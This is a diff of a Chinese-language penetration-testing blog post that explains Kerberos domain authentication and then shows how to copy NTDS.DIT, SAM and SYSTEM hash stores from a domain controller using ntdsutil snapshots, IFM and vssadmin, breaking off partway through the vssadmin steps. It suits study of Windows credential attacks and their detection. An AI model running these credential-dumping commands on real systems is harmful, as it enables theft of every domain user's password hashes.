@@ -16,18 +16,33 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="域环境密码凭证获取windwos域认证">
+    <meta name="description" content="windwos域认证包括三个方面  本地认证：用户直接操作计算机登录账户网络认证：远程连接到工作组中的某个设备域认证：登陆到域环境中的某个设备    域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构  KDC（主要是域控） 的参与  活动目录  活动目录：Active Diretory，AD，是指域环境中提供目录服务的组件。目录用于存储有关网络对象">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域环境密码凭证获取">
 <meta property="og:url" content="https://tsy244.github.io/2024/01/15/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="域环境密码凭证获取windwos域认证">
+<meta property="og:description" content="windwos域认证包括三个方面  本地认证：用户直接操作计算机登录账户网络认证：远程连接到工作组中的某个设备域认证：登陆到域环境中的某个设备    域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构  KDC（主要是域控） 的参与  活动目录  活动目录：Active Diretory，AD，是指域环境中提供目录服务的组件。目录用于存储有关网络对象">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102113692.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102209699.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102442135.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102545161.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110111750.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110141817.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110241407.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110335963.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121115816244.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121115859064.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121120139033.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121121449922.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121123126491.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121124727833.png">
 <meta property="article:published_time" content="2024-01-15T07:37:43.000Z">
-<meta property="article:modified_time" content="2024-01-15T09:53:21.723Z">
+<meta property="article:modified_time" content="2024-01-21T04:55:13.753Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102113692.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -227,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          19 words
+          9.1k words
         
       </span>
     
@@ -238,7 +253,7 @@
         
         
         
-          1 mins
+          77 mins
         
       </span>
     
@@ -281,7 +296,262 @@
             
               <div class="markdown-body">
                 
-                <h1 id="域环境密码凭证获取"><a href="#域环境密码凭证获取" class="headerlink" title="域环境密码凭证获取"></a>域环境密码凭证获取</h1><h2 id="windwos域认证"><a href="#windwos域认证" class="headerlink" title="windwos域认证"></a>windwos域认证</h2>
+                <h1 id="windwos域认证"><a href="#windwos域认证" class="headerlink" title="windwos域认证"></a>windwos域认证</h1><p>包括三个方面</p>
+<blockquote>
+<p>本地认证：用户直接操作计算机登录账户<br>网络认证：远程连接到工作组中的某个设备<br>域认证：登陆到域环境中的某个设备  </p>
+</blockquote>
+<p>域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构  KDC（主要是域控） 的参与 </p>
+<h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><blockquote>
+<p> 活动目录：Active Diretory，AD，是指域环境中提供目录服务的组件。目录用于存储有关网络对象(例  如用户、组、共享资源计算机、、打印机和联系人等)的信息。能够快速、准确的从目录中找到其所需的信息的服务，为企业提供了网络环境集中式管理的机制。														</p>
+</blockquote>
+<p>活动目录主要的功能：  </p>
+<blockquote>
+<p>账号集中管理：所有的账户都存储在服务器中，可以方便快捷的执行命令和管理密码等。<br>软件集中管理：能够统一推送软件，安装网络打印机等服务器<br>环境集中管理：统一客户端桌面、IE等<br>增强安全性：统一部署杀软，统一执行病毒扫描任务、集中管理用户的计算机权限，统一指定密码  策略。<br>更加的可靠更短的宕机时间  </p>
+</blockquote>
+<h2 id="Kerberos协议简介"><a href="#Kerberos协议简介" class="headerlink" title="Kerberos协议简介"></a>Kerberos协议简介</h2><blockquote>
+<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为 客户机&#x2F;服务器 应用程序提供强大的  认证服务。<br>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。<br> 在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享密  钥)执行认证服务的。  </p>
+</blockquote>
+<h2 id="参与域认证的三个角色"><a href="#参与域认证的三个角色" class="headerlink" title="参与域认证的三个角色"></a>参与域认证的三个角色</h2><ul>
+<li><p>访问服务的client</p>
+</li>
+<li><p>提供服务的server</p>
+</li>
+<li><p>KDC密钥分发中心</p>
+<p>在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
+</li>
+</ul>
+<h2 id="Kerberos认证协议基础"><a href="#Kerberos认证协议基础" class="headerlink" title="Kerberos认证协议基础"></a>Kerberos认证协议基础</h2><ul>
+<li>票据(Ticket)</li>
+</ul>
+<p>  是网络对象互相访问的凭证。  </p>
+<ul>
+<li><p>AD(Account Database)</p>
+<p>存储域中所有用户的用户名和对应的 NTLM Hash，可以理解为域中的SAM数据库，KDC 可以从AD中  提取域中所有用户的 NTLM Hash，这是Kerberos 协议能够成功实现的基础。  </p>
+<p>这个ad不一样，这个是数据库，存储了所有用户的hash</p>
+</li>
+<li><p>KDC(Key Distribution Center)</p>
+<p>密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS  和 TGS  </p>
+<p>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+  AS（Authenication Service）+ TGS（Ticket Granting Service）  </p>
+<p>关系的等于，不是数字的等于。这个的意思就是说kdc就是域控</p>
+<p>从物理层面看，AD 与 AS，TGS，KDC均为域控制器(Domain Controller)  </p>
+</li>
+<li><p>AS(Authentication Server)</p>
+</li>
+</ul>
+<p>  身份认证服务，为 Client 生成 TGT 的服务，也用来完成对 Client 的身份验证  </p>
+<ul>
+<li><p>TGS(Ticket Granting Server)</p>
+<p>票据授予服务,为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来  TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访  问对应的服务，该服务提供的票据也称为 TGS 或者叫<strong>白银票据</strong>  </p>
+</li>
+<li><p>TGT(Ticket Granting  Ticket)</p>
+</li>
+</ul>
+<p>  看英文名就知道，用来生成 Ticket 的 Ticket，由身份认证服务授予的票据(黄金票据)，用于身份认  证，存储在内存，默认有效期为10小时  </p>
+<p>  注意：  </p>
+<p>  Client 密钥、TGS 密钥 和 Service 密钥 均为对应用户的 NTLM Hash  TGS密钥 &#x3D;&#x3D; KDC  Hash &#x3D;&#x3D; krbtgt 用户的 NTLM Hash  Server 和 Service 可以当作一个东西，就是 Client 想要访问的服务器或者服务  </p>
+<p>  Client&#x2F;(TGS&#x2F;Server)  Sessionkey 可以看作客户端与 TGS 服务和尝试登陆的 Server 之间会话时  用来加密的密钥，而(Client&#x2F;TGS&#x2F;Service) 密钥(上面提到的三个实际为 NTLM Hash 的密钥)是用  来加密会话密钥的密钥，为了保证会话密钥的传输安全，这些加密方式均为对称加密  </p>
+<p>  参与认证的三个角色的 NTLM Hash 是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥  Sessionkey 的安全传输  </p>
+<h2 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h2><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是  否是可信赖的，也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。  </p>
+<p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候  通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（TGS服务的任务）  </p>
+<p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，  如果要访问其他Server需要向KDC重新申请。  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102113692.png" srcset="/img/loading.gif" lazyload alt="image-20240121102113692"></p>
+<h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102209699.png" srcset="/img/loading.gif" lazyload alt="image-20240121102209699"></p>
+<p>用户输入密码进行NTLM Hash之后作为client的密钥</p>
+<h2 id="请求身份认证"><a href="#请求身份认证" class="headerlink" title="请求身份认证"></a>请求身份认证</h2><p>客户端向AS(身份认证服务)发送认证请求  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102442135.png" srcset="/img/loading.gif" lazyload alt="image-20240121102442135"></p>
+<p>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息  (这个时候还没有发送密码，密钥)</p>
+<p>  AS确认Client端登录者用户身份  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121102545161.png" srcset="/img/loading.gif" lazyload alt="image-20240121102545161"></p>
+<ol>
+<li><p>AS收到用户认证请求之后，根据请求中的 用户名 信息，从数据库中查找该用户名是否存在。  </p>
+</li>
+<li><p>如果 用户名 存在，则根据该用户名提取 NTLM  Hash 做为AS生成的CLIENT 密钥，如果第1步中用户 提供的 密码 信息正确，该秘钥与用户登录中的 CLIENT密钥 是相等的。  </p>
+</li>
+<li><p>AS为Client响应如下消息：</p>
+</li>
+</ol>
+<ul>
+<li>Msg A 使用 KDC 生成的 CLIENT密钥 加密的 CLIENT&#x2F;TGS  SESSIONKEY  </li>
+<li>Msg B 使用 TGS 密钥 加密的 TGT(TICKET-GRANTING-TICKET)，客户端没有 KDC NTLM Hash 因此 Client 无法解密 TGT 。  TGT中包含如下信息：  [Client&#x2F;TGS SessionKey]  Client ID  </li>
+<li>Ticket有效时间  </li>
+<li>CLient 地址</li>
+</ul>
+<ol start="4">
+<li>Client收到AS的响应消息以后，利用自身的 CLIENT 密钥 可以对 Msg A进行解密，这样可以获取到  CLIENT&#x2F;TGS SESSIONKEY 。但由于Msg B是使用 TGS 密钥 加密的，Client 无法对其解密。</li>
+</ol>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110111750.png" srcset="/img/loading.gif" lazyload alt="image-20240121110111750"></p>
+<blockquote>
+<p>  AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。  Client&#x2F;TGS SessionKey 出现了两个Copy，一个给Client端，一个给TGS端。  认证过程中的加密除哈希外均采用的是对称加密算法。  </p>
+</blockquote>
+<h2 id="请求服务授权"><a href="#请求服务授权" class="headerlink" title="请求服务授权"></a>请求服务授权</h2><p>  客户端向TGS发送请求服务授权请求  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110141817.png" srcset="/img/loading.gif" lazyload alt="image-20240121110141817"></p>
+<p>  客户端发送的请求中包含如下两个消息：  </p>
+<p>Msg C  要请求的服务ID, 即 [Service ID]  上一步2.2中由AS为 Client 提供的TGT。  </p>
+<p>Msg D  使用 CLIENT&#x2F;TGS SESSIONKEY 加密的 Authenticator 1 {Client ID, Timestamp}。</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110241407.png" srcset="/img/loading.gif" lazyload alt="image-20240121110241407"></p>
+<p>  KDC接收到TGT与其他内容后，会首先使用KDC 的 NTLM  Hash解密TGT，只有KDC可以解密TGT，从  TGT中提取到 CLIENT&#x2F;TGS SESSIONKEY ，再使用 CLIENT&#x2F;TGS SESSIONKEY 解密Authenticator  1，获取到 {Client ID, Timestamp} 并与通过解密TGT获取到的{Client ID, 有效时间}进行对  比  </p>
+<p>  TGS为Client响应服务授权票据  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121110335963.png" srcset="/img/loading.gif" lazyload alt="image-20240121110335963"></p>
+<h1 id="活动目录数据库"><a href="#活动目录数据库" class="headerlink" title="活动目录数据库"></a>活动目录数据库</h1><p>  Active Directory 域服务AD DS 数据存储：  </p>
+<ul>
+<li>由 NTDS.DIT 文件构成，是Active Directory的核心  </li>
+<li>默认存储在域控的 %SystemRoot%\ntds\ 文件夹下  </li>
+<li><strong>只能通过域控制器进程和协议访问</strong></li>
+</ul>
+<blockquote>
+<p>  活动目录数据库 NTDS.DIT：NTDS.DIT是主要的AD数据库，包括有关域用户，组和组成员身份的信  息。它还包括域中所有用户的密码哈希值。</p>
+</blockquote>
+<p>这个文件对于内网渗透来说非常非常的重要</p>
+<p>在工作组环境中，<strong>SAM</strong>文件存储着当前主机用户的密码哈希值  </p>
+<p>在域环境中，<strong>NTDS.DIT</strong>文件存储了域中所有用户的密码哈希值  </p>
+<p>如果有这两个文件我们就可以获取到存储的密码的hash值</p>
+<p> Windows系统为了进一步保护存储的密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密。</p>
+<p>因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件</p>
+<blockquote>
+<p>NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit（C:\Windows\NTDS\NTDS.dit）  </p>
+<p>SYSTEM文件位置： %SystemRoot%\System32\config\SYSTEM（C:\Windows\System32\config\SYSTEM  ）  </p>
+<p>SAM文件位置：  %SystemRoot%\System32\config\SAM（C:\Windows\System32\config\SAM）</p>
+</blockquote>
+<p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用，所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取。</p>
+<h1 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h1><blockquote>
+<p>Volume Shadow Copy Service 卷影复制服务（VSS）是微软从 Windows XP 开始提供的用于创建  一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件  都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。  </p>
+</blockquote>
+<ul>
+<li><p>这个微软提供的服务可以解除NTDS.DIT一直占用的状态，然后将其以生成快照的方式获取到</p>
+</li>
+<li><p>用于数据备份  支持 Windows Server 2003 及以上操作系统  </p>
+</li>
+<li><p>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备 份，该时间无法确定 </p>
+</li>
+<li><p>禁用 VSS 会影响系统正常使用，如 System Restore 和 Windows Server Backup  </p>
+<p>我们可以利用 Volume  Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本。  </p>
+<p>注意：</p>
+</li>
+</ul>
+<ol>
+<li>调用 Volume  Shadow Copy 服务会产生SYSTEM日志，Event ID 为7036。  </li>
+<li>执行 ntdsutil  snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为 98 的日志</li>
+</ol>
+<h1 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h1><blockquote>
+<p>Ntdsutil.exe 是一个命令行工具，它为 Active Directory 域服务 (AD DS) 和 Active  Directory轻型目录服务 (AD LDS) 提供管理工具。您可以使用ntdsutil命令执行 AD DS 的数据库维  护，管理和控制单个主机操作，并删除域控制器留下的元数据，这些域控制器在未正确卸载的情况下  从网络中删除 </p>
+<p>域环境默认安装，要使用 Ntdsutil.exe，必须从管理员命令提示符运行  </p>
+<p>如果安装了 AD  LDS 服务器角色但未安装 AD DS 服务器角色，则可以使用 dsdbutil.exe 和  dsmgmt.exe 命令行工具来执行可以使用 ntdsutil.exe 执行的相同任务。  </p>
+</blockquote>
+<p>创建快照 ，从而获取到NTDS.DIT的备份</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>使用管理员打开cmd，必须是cmd，powershell无法完成</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># 进入ntdsutil命令行</span><br>ntdsutil<br><br><span class="hljs-comment"># 进入快照</span><br>snapshot<br><br><span class="hljs-comment"># 激活 AD DS 实例</span><br>activate<span class="hljs-built_in"> instance </span>ntds<br><br>create<br>mount [GUID]<br>copy C:\$SNAP_202205161140_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit<br><br><span class="hljs-comment"># copy 完之后再执行</span><br>unmount [GUID]<br>del [GUID]<br></code></pre></td></tr></table></figure>
+
+<p>然后就可以目录访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121115816244.png" srcset="/img/loading.gif" lazyload alt="image-20240121115816244"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121115859064.png" srcset="/img/loading.gif" lazyload alt="image-20240121115859064"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121120139033.png" srcset="/img/loading.gif" lazyload alt="image-20240121120139033"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>在进入ntdsutil之后</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#激活 AD DS 实例</span><br>activate<span class="hljs-built_in"> instance </span>ntds<br><br><span class="hljs-comment">#为可写（full）和只读域控制器 (RODC) 和 AD LDS 实例创建安装介质。</span><br>ifm<br><br><span class="hljs-comment">#为可写 Active Directory 域控制器或 AD LDS 实例创建安装介质到指定文件夹中</span><br>create full &lt;Drive&gt;:\&lt;Folder&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="方法三-非交互式"><a href="#方法三-非交互式" class="headerlink" title="方法三(非交互式)"></a>方法三(非交互式)</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br>ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;mount &#123;GUID&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br>copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit<br>ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;GUID&#125;&quot;</span> <span class="hljs-string">&quot;delete &#123;GUID&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
+
+<p> 查询当前系统的快照  </p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;List All&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br>ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;List Mounted&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
+
+<p>创建快照</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
+
+<p>挂载快照</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
+
+<p>复制ntds.dit</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">copy C:\<span class="hljs-symbol">$</span>SNAP_202008271744_VOLUMEC<span class="hljs-symbol">$</span>\windows\NTDS\ntds.dit c:\ntds2.dit<br>copy C:\<span class="hljs-symbol">$</span>SNAP_202008271744_VOLUMEC<span class="hljs-symbol">$</span>\windows\system32\config\<span class="hljs-keyword">SYSTEM</span> c:\<span class="hljs-keyword">SYSTEM</span><br></code></pre></td></tr></table></figure>
+
+<p>卸载快照</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
+
+<p>删除快照</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h1><blockquote>
+<p>  vssadmin：卷影复制服务管理命令行工具  域环境默认安装 </p>
+</blockquote>
+<ol>
+<li>查询当前系统的快照</li>
+</ol>
+   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadows</span><br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121121449922.png" srcset="/img/loading.gif" lazyload alt="image-20240121121449922"></p>
+<ol start="2">
+<li><p>创建快照</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=c:<br></code></pre></td></tr></table></figure>
+
+<p>  获得Shadow  Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10  </p>
+</li>
+<li><p>访问快照中的文件  </p>
+<p>查看快照列表：</p>
+</li>
+</ol>
